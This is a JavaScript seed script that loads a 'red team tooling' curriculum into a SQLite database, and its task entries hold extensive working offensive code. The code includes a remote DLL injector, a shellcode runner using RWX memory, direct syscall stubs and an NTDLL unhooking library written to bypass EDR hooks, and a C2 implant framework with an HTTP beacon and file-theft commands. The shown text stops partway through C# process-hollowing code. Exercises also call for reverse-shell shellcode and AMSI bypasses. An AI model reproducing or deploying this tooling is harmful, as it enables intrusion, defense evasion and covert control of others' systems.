import Database from 'better-sqlite3';

const sqlite = new Database('data/quest-log.db');

const insertPath = sqlite.prepare(
	'INSERT INTO paths (name, description, color, language, difficulty, estimated_weeks, skills, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)'
);
const insertModule = sqlite.prepare(
	'INSERT INTO modules (path_id, name, description, order_index, created_at) VALUES (?, ?, ?, ?, ?)'
);
const insertTask = sqlite.prepare(
	'INSERT INTO tasks (module_id, title, description, details, order_index, created_at) VALUES (?, ?, ?, ?, ?, ?)'
);

const now = Date.now();

// ============================================================================
// COMPLETE RED TEAM TOOLING - C/C++
// ============================================================================
const cPath = insertPath.run(
	'Red Team Tooling: C/C++ Fundamentals',
	'Build low-level offensive tools in C and C++. Learn Windows internals, memory manipulation, shellcode development, and evasion techniques at the systems level.',
	'red',
	'C+Python+C#+Rust',
	'advanced',
	12,
	'Windows internals, memory manipulation, shellcode, PE format, syscalls, evasion',
	now
);

// Module 1: C Foundations for Offensive Security
const cMod1 = insertModule.run(cPath.lastInsertRowid, 'C Foundations for Offensive Security', 'Master C programming for security tool development', 0, now);

insertTask.run(cMod1.lastInsertRowid, 'Build a Windows Process Lister', 'Use CreateToolhelp32Snapshot or NtQuerySystemInformation to enumerate running processes, extracting PIDs, names, parent relationships, and loaded modules for situational awareness on compromised hosts', `## Windows Process Enumerator in C

### Implementation
\`\`\`c
// process_list.c
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

typedef struct {
    DWORD pid;
    DWORD ppid;
    char name[MAX_PATH];
    char path[MAX_PATH];
} ProcessInfo;

BOOL GetProcessPath(DWORD pid, char* path, DWORD pathLen) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProcess) return FALSE;

    DWORD size = pathLen;
    BOOL result = QueryFullProcessImageNameA(hProcess, 0, path, &size);
    CloseHandle(hProcess);
    return result;
}

int EnumerateProcesses(ProcessInfo** processes, int* count) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return -1;

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Count processes first
    *count = 0;
    if (Process32First(hSnapshot, &pe32)) {
        do { (*count)++; } while (Process32Next(hSnapshot, &pe32));
    }

    // Allocate array
    *processes = (ProcessInfo*)malloc(*count * sizeof(ProcessInfo));

    // Fill array
    int i = 0;
    Process32First(hSnapshot, &pe32);
    do {
        (*processes)[i].pid = pe32.th32ProcessID;
        (*processes)[i].ppid = pe32.th32ParentProcessID;
        strncpy((*processes)[i].name, pe32.szExeFile, MAX_PATH);

        if (!GetProcessPath(pe32.th32ProcessID, (*processes)[i].path, MAX_PATH)) {
            strcpy((*processes)[i].path, "Access Denied");
        }
        i++;
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return 0;
}

void PrintProcessTree(ProcessInfo* procs, int count, DWORD ppid, int indent) {
    for (int i = 0; i < count; i++) {
        if (procs[i].ppid == ppid) {
            printf("%*s[%5d] %s\\n", indent, "", procs[i].pid, procs[i].name);
            PrintProcessTree(procs, count, procs[i].pid, indent + 2);
        }
    }
}

int main(int argc, char* argv[]) {
    ProcessInfo* processes;
    int count;

    printf("=== Process Enumerator ===\\n\\n");

    if (EnumerateProcesses(&processes, &count) != 0) {
        printf("Error enumerating processes\\n");
        return 1;
    }

    if (argc > 1 && strcmp(argv[1], "-tree") == 0) {
        printf("Process Tree:\\n");
        PrintProcessTree(processes, count, 0, 0);
    } else {
        printf("%-6s %-6s %-30s %s\\n", "PID", "PPID", "Name", "Path");
        printf("%s\\n", "--------------------------------------------------------------------------------");
        for (int i = 0; i < count; i++) {
            printf("%-6d %-6d %-30s %s\\n",
                processes[i].pid,
                processes[i].ppid,
                processes[i].name,
                processes[i].path);
        }
    }

    printf("\\nTotal: %d processes\\n", count);
    free(processes);
    return 0;
}
\`\`\`

### Compile
\`\`\`bash
# MinGW
x86_64-w64-mingw32-gcc process_list.c -o process_list.exe

# Visual Studio
cl process_list.c /Fe:process_list.exe
\`\`\`

### Exercises
1. Add filtering by process name
2. Add memory usage display
3. Add CPU usage calculation
4. Export to JSON format`, 0, now);

insertTask.run(cMod1.lastInsertRowid, 'Implement DLL Injection via CreateRemoteThread', 'Inject a malicious DLL into a remote process by allocating memory with VirtualAllocEx, writing the DLL path with WriteProcessMemory, and spawning a thread via CreateRemoteThread that calls LoadLibrary', `## DLL Injection in C

### Injector Implementation
\`\`\`c
// injector.c
#include <windows.h>
#include <stdio.h>

BOOL InjectDLL(DWORD pid, const char* dllPath) {
    HANDLE hProcess = NULL;
    LPVOID remoteBuffer = NULL;
    HANDLE hThread = NULL;
    BOOL success = FALSE;

    // Get full path
    char fullPath[MAX_PATH];
    GetFullPathNameA(dllPath, MAX_PATH, fullPath, NULL);

    printf("[*] Injecting: %s\\n", fullPath);
    printf("[*] Target PID: %d\\n", pid);

    // Open target process
    hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE, pid);

    if (!hProcess) {
        printf("[-] OpenProcess failed: %d\\n", GetLastError());
        goto cleanup;
    }
    printf("[+] Opened process handle\\n");

    // Allocate memory in target
    size_t pathLen = strlen(fullPath) + 1;
    remoteBuffer = VirtualAllocEx(hProcess, NULL, pathLen,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!remoteBuffer) {
        printf("[-] VirtualAllocEx failed: %d\\n", GetLastError());
        goto cleanup;
    }
    printf("[+] Allocated %zu bytes at 0x%p\\n", pathLen, remoteBuffer);

    // Write DLL path to target
    if (!WriteProcessMemory(hProcess, remoteBuffer, fullPath, pathLen, NULL)) {
        printf("[-] WriteProcessMemory failed: %d\\n", GetLastError());
        goto cleanup;
    }
    printf("[+] Wrote DLL path to target\\n");

    // Get LoadLibraryA address
    LPVOID loadLibAddr = (LPVOID)GetProcAddress(
        GetModuleHandleA("kernel32.dll"), "LoadLibraryA");

    if (!loadLibAddr) {
        printf("[-] GetProcAddress failed\\n");
        goto cleanup;
    }
    printf("[+] LoadLibraryA at 0x%p\\n", loadLibAddr);

    // Create remote thread
    hThread = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)loadLibAddr, remoteBuffer, 0, NULL);

    if (!hThread) {
        printf("[-] CreateRemoteThread failed: %d\\n", GetLastError());
        goto cleanup;
    }
    printf("[+] Created remote thread\\n");

    // Wait for thread
    WaitForSingleObject(hThread, INFINITE);

    DWORD exitCode;
    GetExitCodeThread(hThread, &exitCode);
    printf("[+] Thread exited with code: 0x%08X\\n", exitCode);

    success = (exitCode != 0);

cleanup:
    if (hThread) CloseHandle(hThread);
    if (remoteBuffer) VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
    if (hProcess) CloseHandle(hProcess);

    return success;
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        printf("Usage: %s <PID> <DLL_PATH>\\n", argv[0]);
        return 1;
    }

    DWORD pid = atoi(argv[1]);
    const char* dllPath = argv[2];

    if (InjectDLL(pid, dllPath)) {
        printf("[+] Injection successful!\\n");
        return 0;
    } else {
        printf("[-] Injection failed!\\n");
        return 1;
    }
}
\`\`\`

### Test DLL
\`\`\`c
// payload.c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
    switch (reason) {
        case DLL_PROCESS_ATTACH:
            MessageBoxA(NULL, "DLL Injected!", "Success", MB_OK);
            break;
    }
    return TRUE;
}
\`\`\`

### Compile
\`\`\`bash
# Injector
x86_64-w64-mingw32-gcc injector.c -o injector.exe

# Payload DLL
x86_64-w64-mingw32-gcc -shared payload.c -o payload.dll
\`\`\``, 1, now);

insertTask.run(cMod1.lastInsertRowid, 'Write Position-Independent Shellcode', 'Develop shellcode using only relative addressing, PEB walking to resolve kernel32 and function addresses dynamically, and null-byte avoidance for successful injection into arbitrary memory locations', `## Position-Independent Shellcode in C

### Understanding PIC
\`\`\`
Position-Independent Code (PIC) can run at any memory address.
Key techniques:
1. No hardcoded addresses
2. Find kernel32.dll via PEB
3. Resolve APIs dynamically
4. Use relative addressing
\`\`\`

### Shellcode Generator
\`\`\`c
// shellcode_gen.c
#include <windows.h>
#include <stdio.h>

// This generates the shellcode bytes from assembly
// The actual shellcode must be written in assembly

// Example: MessageBox shellcode structure
/*
  1. Get kernel32.dll base via PEB
  2. Find GetProcAddress
  3. Load user32.dll
  4. Get MessageBoxA
  5. Call MessageBox
  6. Get ExitProcess
  7. Call ExitProcess
*/

// Minimal calc.exe launcher shellcode (x64)
unsigned char shellcode[] =
    "\\x48\\x31\\xc9"                     // xor rcx, rcx
    "\\x48\\x81\\xec\\x00\\x02\\x00\\x00" // sub rsp, 0x200
    "\\x48\\x31\\xd2"                     // xor rdx, rdx
    "\\x65\\x48\\x8b\\x42\\x60"           // mov rax, gs:[rdx+0x60] ; PEB
    "\\x48\\x8b\\x40\\x18"                 // mov rax, [rax+0x18]    ; Ldr
    "\\x48\\x8b\\x70\\x20"                 // mov rsi, [rax+0x20]    ; InMemoryOrderList
    // ... (full shellcode would be hundreds of bytes)
    "\\xcc";  // int3 placeholder

void TestShellcode() {
    // Allocate executable memory
    void* exec = VirtualAlloc(NULL, sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!exec) {
        printf("VirtualAlloc failed\\n");
        return;
    }

    // Copy shellcode
    memcpy(exec, shellcode, sizeof(shellcode));

    printf("[*] Shellcode at: 0x%p\\n", exec);
    printf("[*] Size: %zu bytes\\n", sizeof(shellcode));
    printf("[*] Executing...\\n");

    // Execute
    ((void(*)())exec)();
}

// Convert binary to C array
void BinaryToArray(const char* filename) {
    FILE* f = fopen(filename, "rb");
    if (!f) return;

    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    fseek(f, 0, SEEK_SET);

    printf("unsigned char shellcode[%ld] = {\\n    ", size);

    unsigned char byte;
    int col = 0;
    while (fread(&byte, 1, 1, f) == 1) {
        printf("0x%02x", byte);
        if (ftell(f) < size) printf(", ");
        if (++col >= 12) {
            printf("\\n    ");
            col = 0;
        }
    }
    printf("\\n};\\n");

    fclose(f);
}

int main(int argc, char* argv[]) {
    if (argc > 1) {
        BinaryToArray(argv[1]);
    } else {
        TestShellcode();
    }
    return 0;
}
\`\`\`

### Assembly Shellcode (NASM)
\`\`\`nasm
; shellcode.asm - x64 MessageBox
; nasm -f win64 shellcode.asm -o shellcode.obj
; Requires manual linking and extraction

BITS 64
section .text
global _start

_start:
    ; Find kernel32.dll
    xor rcx, rcx
    mov rax, gs:[rcx + 0x60]     ; PEB
    mov rax, [rax + 0x18]        ; Ldr
    mov rsi, [rax + 0x20]        ; InMemoryOrderModuleList
    lodsq                        ; skip first entry
    xchg rax, rsi
    lodsq                        ; second entry (ntdll)
    xchg rax, rsi
    lodsq                        ; third entry (kernel32)
    mov rbx, [rax + 0x20]        ; kernel32 base

    ; ... continue to resolve GetProcAddress and call APIs
\`\`\`

### Exercises
1. Write calc.exe spawner shellcode
2. Add XOR encoding
3. Create reverse shell shellcode
4. Implement staged shellcode loader`, 2, now);

insertTask.run(cMod1.lastInsertRowid, 'Implement Direct Syscalls', 'Invoke Windows syscalls directly by loading syscall numbers from ntdll, setting up the stack and registers, and executing the syscall instruction to bypass EDR hooks on user-mode API functions', `## Direct Syscalls in C

### Understanding Syscalls
\`\`\`
Normal flow: Your code -> kernel32.dll -> ntdll.dll -> syscall -> kernel
With hooks: Your code -> kernel32.dll -> ntdll.dll (HOOKED) -> EDR -> syscall
Direct:     Your code -> syscall instruction directly (bypass hooks!)
\`\`\`

### Syscall Implementation
\`\`\`c
// syscalls.h
#ifndef SYSCALLS_H
#define SYSCALLS_H

#include <windows.h>

// Syscall numbers (Windows 10 21H2 - varies by version!)
#define SYSCALL_NtAllocateVirtualMemory 0x18
#define SYSCALL_NtWriteVirtualMemory    0x3A
#define SYSCALL_NtCreateThreadEx        0xC1
#define SYSCALL_NtProtectVirtualMemory  0x50

// Function prototypes
typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

// Syscall stub in assembly
extern NTSTATUS SyscallNtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

#endif
\`\`\`

### Assembly Stubs (syscalls.asm)
\`\`\`nasm
; syscalls.asm - x64 syscall stubs
; Compile: nasm -f win64 syscalls.asm -o syscalls.obj

section .text

global SyscallNtAllocateVirtualMemory
SyscallNtAllocateVirtualMemory:
    mov r10, rcx
    mov eax, 0x18           ; NtAllocateVirtualMemory syscall number
    syscall
    ret

global SyscallNtWriteVirtualMemory
SyscallNtWriteVirtualMemory:
    mov r10, rcx
    mov eax, 0x3A           ; NtWriteVirtualMemory syscall number
    syscall
    ret

global SyscallNtProtectVirtualMemory
SyscallNtProtectVirtualMemory:
    mov r10, rcx
    mov eax, 0x50           ; NtProtectVirtualMemory syscall number
    syscall
    ret

global SyscallNtCreateThreadEx
SyscallNtCreateThreadEx:
    mov r10, rcx
    mov eax, 0xC1           ; NtCreateThreadEx syscall number
    syscall
    ret
\`\`\`

### Dynamic Syscall Resolution
\`\`\`c
// dynamic_syscalls.c
#include <windows.h>
#include <stdio.h>

// Get syscall number from ntdll.dll
DWORD GetSyscallNumber(const char* funcName) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;

    BYTE* funcAddr = (BYTE*)GetProcAddress(ntdll, funcName);
    if (!funcAddr) return 0;

    // Check for syscall pattern:
    // mov r10, rcx  (4C 8B D1)
    // mov eax, SSN  (B8 XX XX XX XX)
    if (funcAddr[0] == 0x4C && funcAddr[1] == 0x8B && funcAddr[2] == 0xD1 &&
        funcAddr[3] == 0xB8) {
        // SSN is at offset 4 (4 bytes, little-endian)
        return *(DWORD*)(funcAddr + 4);
    }

    // Function might be hooked - look for syscall instruction
    for (int i = 0; i < 32; i++) {
        if (funcAddr[i] == 0x0F && funcAddr[i+1] == 0x05) {
            // Found syscall, SSN should be nearby
            for (int j = i - 1; j >= 0; j--) {
                if (funcAddr[j] == 0xB8) {
                    return *(DWORD*)(funcAddr + j + 1);
                }
            }
        }
    }

    return 0;
}

// Hell's Gate technique - resolve from clean copy
DWORD HellsGate(const char* funcName) {
    // Read ntdll from disk
    HANDLE hFile = CreateFileA("C:\\\\Windows\\\\System32\\\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

    if (hFile == INVALID_HANDLE_VALUE) return 0;

    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE* ntdllBuffer = (BYTE*)VirtualAlloc(NULL, fileSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    ReadFile(hFile, ntdllBuffer, fileSize, NULL, NULL);
    CloseHandle(hFile);

    // Parse PE and find function
    // ... (PE parsing to find export)

    VirtualFree(ntdllBuffer, 0, MEM_RELEASE);
    return 0; // Implement PE parsing
}

int main() {
    DWORD ssn;

    printf("=== Syscall Number Resolver ===\\n\\n");

    ssn = GetSyscallNumber("NtAllocateVirtualMemory");
    printf("NtAllocateVirtualMemory: 0x%X\\n", ssn);

    ssn = GetSyscallNumber("NtWriteVirtualMemory");
    printf("NtWriteVirtualMemory:    0x%X\\n", ssn);

    ssn = GetSyscallNumber("NtCreateThreadEx");
    printf("NtCreateThreadEx:        0x%X\\n", ssn);

    ssn = GetSyscallNumber("NtProtectVirtualMemory");
    printf("NtProtectVirtualMemory:  0x%X\\n", ssn);

    return 0;
}
\`\`\`

### Exercises
1. Implement full Hell's Gate technique
2. Add Halo's Gate (resolve from neighbor functions)
3. Create syscall-based shellcode injector
4. Implement indirect syscalls`, 3, now);

// Module 2: C++ Offensive Tools
const cMod2 = insertModule.run(cPath.lastInsertRowid, 'C++ Advanced Offensive Tools', 'Object-oriented approach to malware development', 1, now);

insertTask.run(cMod2.lastInsertRowid, 'Build a Modular C2 Implant Framework', 'Design a plugin-based implant in C++ with dynamic module loading, encrypted C2 communications, reflective DLL injection for in-memory execution, and extensible command handlers for post-exploitation', `## C++ Modular Implant Framework

### Architecture
\`\`\`
Implant
├── Core
│   ├── Comms (HTTP, DNS, SMB)
│   ├── Crypto (AES, ChaCha20)
│   └── Config
├── Modules
│   ├── FileOps
│   ├── ProcessOps
│   ├── Registry
│   └── Credentials
└── Evasion
    ├── Unhooking
    ├── AMSI Bypass
    └── ETW Patch
\`\`\`

### Core Framework
\`\`\`cpp
// implant.hpp
#pragma once
#include <windows.h>
#include <string>
#include <vector>
#include <memory>
#include <functional>
#include <map>

namespace Implant {

// Command result
struct Result {
    bool success;
    std::string output;
    std::vector<uint8_t> data;
};

// Module interface
class IModule {
public:
    virtual ~IModule() = default;
    virtual std::string GetName() const = 0;
    virtual Result Execute(const std::string& cmd, const std::vector<std::string>& args) = 0;
};

// Communication interface
class IComms {
public:
    virtual ~IComms() = default;
    virtual bool Connect() = 0;
    virtual bool Send(const std::vector<uint8_t>& data) = 0;
    virtual std::vector<uint8_t> Receive() = 0;
    virtual void Disconnect() = 0;
};

// Core implant class
class Core {
public:
    Core();
    ~Core();

    void RegisterModule(std::unique_ptr<IModule> module);
    void SetComms(std::unique_ptr<IComms> comms);

    void Run();
    void Stop();

    Result ExecuteCommand(const std::string& module,
                          const std::string& cmd,
                          const std::vector<std::string>& args);

private:
    std::map<std::string, std::unique_ptr<IModule>> modules_;
    std::unique_ptr<IComms> comms_;
    bool running_ = false;

    void ProcessTask(const std::vector<uint8_t>& task);
};

} // namespace Implant
\`\`\`

### Module Example: File Operations
\`\`\`cpp
// modules/fileops.hpp
#pragma once
#include "implant.hpp"
#include <fstream>
#include <filesystem>

namespace Implant {

class FileOpsModule : public IModule {
public:
    std::string GetName() const override { return "fileops"; }

    Result Execute(const std::string& cmd,
                   const std::vector<std::string>& args) override {
        if (cmd == "ls") return ListDirectory(args);
        if (cmd == "cat") return ReadFile(args);
        if (cmd == "write") return WriteFile(args);
        if (cmd == "download") return DownloadFile(args);
        if (cmd == "upload") return UploadFile(args);

        return {false, "Unknown command: " + cmd, {}};
    }

private:
    Result ListDirectory(const std::vector<std::string>& args) {
        std::string path = args.empty() ? "." : args[0];
        std::string output;

        try {
            for (const auto& entry : std::filesystem::directory_iterator(path)) {
                output += entry.path().filename().string();
                if (entry.is_directory()) output += "/";
                output += "\\n";
            }
            return {true, output, {}};
        } catch (const std::exception& e) {
            return {false, e.what(), {}};
        }
    }

    Result ReadFile(const std::vector<std::string>& args) {
        if (args.empty()) return {false, "No file specified", {}};

        std::ifstream file(args[0], std::ios::binary);
        if (!file) return {false, "Cannot open file", {}};

        std::vector<uint8_t> data(
            (std::istreambuf_iterator<char>(file)),
            std::istreambuf_iterator<char>()
        );

        return {true, "Read " + std::to_string(data.size()) + " bytes", data};
    }

    Result WriteFile(const std::vector<std::string>& args);
    Result DownloadFile(const std::vector<std::string>& args);
    Result UploadFile(const std::vector<std::string>& args);
};

} // namespace Implant
\`\`\`

### HTTP Communications
\`\`\`cpp
// comms/http.hpp
#pragma once
#include "implant.hpp"
#include <winhttp.h>
#pragma comment(lib, "winhttp.lib")

namespace Implant {

class HTTPComms : public IComms {
public:
    HTTPComms(const std::wstring& host, uint16_t port, bool useSSL = true)
        : host_(host), port_(port), useSSL_(useSSL) {}

    bool Connect() override {
        session_ = WinHttpOpen(
            L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS, 0);

        if (!session_) return false;

        connection_ = WinHttpConnect(session_, host_.c_str(), port_, 0);
        return connection_ != nullptr;
    }

    bool Send(const std::vector<uint8_t>& data) override {
        DWORD flags = useSSL_ ? WINHTTP_FLAG_SECURE : 0;

        HINTERNET request = WinHttpOpenRequest(
            connection_, L"POST", L"/api/beacon",
            nullptr, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES, flags);

        if (!request) return false;

        // Add headers
        WinHttpAddRequestHeaders(request,
            L"Content-Type: application/octet-stream",
            -1L, WINHTTP_ADDREQ_FLAG_ADD);

        BOOL result = WinHttpSendRequest(
            request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            (LPVOID)data.data(), (DWORD)data.size(),
            (DWORD)data.size(), 0);

        if (result) {
            result = WinHttpReceiveResponse(request, nullptr);
        }

        WinHttpCloseHandle(request);
        return result;
    }

    std::vector<uint8_t> Receive() override {
        // ... implement receiving response
        return {};
    }

    void Disconnect() override {
        if (connection_) WinHttpCloseHandle(connection_);
        if (session_) WinHttpCloseHandle(session_);
    }

private:
    std::wstring host_;
    uint16_t port_;
    bool useSSL_;
    HINTERNET session_ = nullptr;
    HINTERNET connection_ = nullptr;
};

} // namespace Implant
\`\`\`

### Exercises
1. Add process operations module
2. Implement DNS-based comms
3. Add AES encryption layer
4. Implement sleep obfuscation`, 0, now);

insertTask.run(cMod2.lastInsertRowid, 'Create NTDLL Unhooking Library', 'Restore original ntdll.dll syscall stubs by reading a clean copy from disk or KnownDlls, comparing with the in-memory version, and overwriting EDR inline hooks to bypass userland API monitoring', `## NTDLL Unhooking in C++

### Implementation
\`\`\`cpp
// unhook.hpp
#pragma once
#include <windows.h>
#include <vector>
#include <string>

namespace Unhook {

class NtdllUnhooker {
public:
    bool UnhookFromDisk();
    bool UnhookFromKnownDlls();
    bool UnhookFromSuspendedProcess();

    bool IsHooked(const char* funcName);
    std::vector<std::string> GetHookedFunctions();

private:
    bool MapCleanNtdll(void** mappedBase, size_t* mappedSize);
    bool OverwriteTextSection(void* cleanBase, void* loadedBase);

    PIMAGE_NT_HEADERS GetNtHeaders(void* base);
    PIMAGE_SECTION_HEADER GetTextSection(void* base);
};

// Implementation
bool NtdllUnhooker::UnhookFromDisk() {
    HANDLE hFile = CreateFileA(
        "C:\\\\Windows\\\\System32\\\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ, nullptr,
        OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE) return false;

    DWORD fileSize = GetFileSize(hFile, nullptr);

    // Map file into memory
    HANDLE hMapping = CreateFileMappingA(
        hFile, nullptr, PAGE_READONLY | SEC_IMAGE, 0, 0, nullptr);
    CloseHandle(hFile);

    if (!hMapping) return false;

    void* mappedBase = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(hMapping);

    if (!mappedBase) return false;

    // Get loaded ntdll base
    void* loadedBase = GetModuleHandleA("ntdll.dll");

    // Get .text section info
    auto cleanNt = GetNtHeaders(mappedBase);
    auto loadedNt = GetNtHeaders(loadedBase);

    PIMAGE_SECTION_HEADER cleanText = GetTextSection(mappedBase);
    PIMAGE_SECTION_HEADER loadedText = GetTextSection(loadedBase);

    if (!cleanText || !loadedText) {
        UnmapViewOfFile(mappedBase);
        return false;
    }

    // Calculate addresses
    void* cleanTextAddr = (void*)((BYTE*)mappedBase + cleanText->VirtualAddress);
    void* loadedTextAddr = (void*)((BYTE*)loadedBase + loadedText->VirtualAddress);
    size_t textSize = cleanText->Misc.VirtualSize;

    // Change protection and overwrite
    DWORD oldProtect;
    if (!VirtualProtect(loadedTextAddr, textSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        UnmapViewOfFile(mappedBase);
        return false;
    }

    memcpy(loadedTextAddr, cleanTextAddr, textSize);

    VirtualProtect(loadedTextAddr, textSize, oldProtect, &oldProtect);

    UnmapViewOfFile(mappedBase);
    return true;
}

bool NtdllUnhooker::IsHooked(const char* funcName) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    void* funcAddr = GetProcAddress(ntdll, funcName);
    if (!funcAddr) return false;

    BYTE* bytes = (BYTE*)funcAddr;

    // Check for common hook patterns
    // JMP (E9 or FF 25)
    if (bytes[0] == 0xE9) return true;
    if (bytes[0] == 0xFF && bytes[1] == 0x25) return true;

    // Should start with: mov r10, rcx (4C 8B D1)
    if (bytes[0] != 0x4C || bytes[1] != 0x8B || bytes[2] != 0xD1) {
        return true;  // Modified
    }

    return false;
}

std::vector<std::string> NtdllUnhooker::GetHookedFunctions() {
    std::vector<std::string> hooked;

    const char* funcs[] = {
        "NtAllocateVirtualMemory",
        "NtWriteVirtualMemory",
        "NtCreateThreadEx",
        "NtMapViewOfSection",
        "NtProtectVirtualMemory",
        "NtQueueApcThread",
        "NtSetContextThread",
        "NtResumeThread",
        "NtCreateProcess",
        "NtCreateUserProcess",
        nullptr
    };

    for (int i = 0; funcs[i]; i++) {
        if (IsHooked(funcs[i])) {
            hooked.push_back(funcs[i]);
        }
    }

    return hooked;
}

PIMAGE_NT_HEADERS NtdllUnhooker::GetNtHeaders(void* base) {
    auto dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;

    auto nt = (PIMAGE_NT_HEADERS)((BYTE*)base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return nullptr;

    return nt;
}

PIMAGE_SECTION_HEADER NtdllUnhooker::GetTextSection(void* base) {
    auto nt = GetNtHeaders(base);
    if (!nt) return nullptr;

    auto section = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)section[i].Name, ".text") == 0) {
            return &section[i];
        }
    }
    return nullptr;
}

} // namespace Unhook
\`\`\`

### Usage Example
\`\`\`cpp
#include "unhook.hpp"
#include <iostream>

int main() {
    Unhook::NtdllUnhooker unhooker;

    std::cout << "=== NTDLL Unhooker ===\\n\\n";

    // Check for hooks before
    std::cout << "Hooked functions before:\\n";
    auto hooked = unhooker.GetHookedFunctions();
    for (const auto& func : hooked) {
        std::cout << "  [!] " << func << "\\n";
    }

    if (hooked.empty()) {
        std::cout << "  No hooks detected\\n";
    }

    // Unhook
    std::cout << "\\n[*] Unhooking from disk...\\n";
    if (unhooker.UnhookFromDisk()) {
        std::cout << "[+] Unhook successful!\\n";
    } else {
        std::cout << "[-] Unhook failed!\\n";
    }

    // Verify
    std::cout << "\\nHooked functions after:\\n";
    hooked = unhooker.GetHookedFunctions();
    if (hooked.empty()) {
        std::cout << "  All clear!\\n";
    }

    return 0;
}
\`\`\``, 1, now);

// ============================================================================
// C# RED TEAM TOOLS
// ============================================================================
const csPath = insertPath.run(
	'Red Team Tooling: C# & .NET',
	'Build Windows-focused offensive tools using C# and .NET. Create assemblies for in-memory execution, bypass AMSI, and leverage .NET reflection for evasion.',
	'purple',
	'C#',
	'advanced',
	10,
	'.NET internals, reflection, AMSI bypass, assembly loading, WMI, COM objects',
	now
);

const csMod1 = insertModule.run(csPath.lastInsertRowid, 'C# Offensive Fundamentals', 'Learn .NET tradecraft for red team operations', 0, now);

insertTask.run(csMod1.lastInsertRowid, 'Build Process Hollowing in C#', 'Create a suspended legitimate process, unmap its memory sections using NtUnmapViewOfSection, write malicious code into the hollowed process, fix the entry point, and resume execution for defense evasion', `## Process Hollowing in C#

### Implementation
\`\`\`csharp
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace ProcessHollowing
{
    class Program
    {
        // P/Invoke declarations
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern int NtUnmapViewOfSection(IntPtr hProcess, IntPtr pBaseAddress);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            uint nSize,
            out uint lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll")]
        static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int dwSize,
            out int lpNumberOfBytesRead);

        const uint CREATE_SUSPENDED = 0x00000004;
        const uint MEM_COMMIT = 0x00001000;
        const uint MEM_RESERVE = 0x00002000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;
        const ulong CONTEXT_FULL = 0x10001F;

        [StructLayout(LayoutKind.Sequential)]
        struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX, dwY, dwXSize, dwYSize;
            public uint dwXCountChars, dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
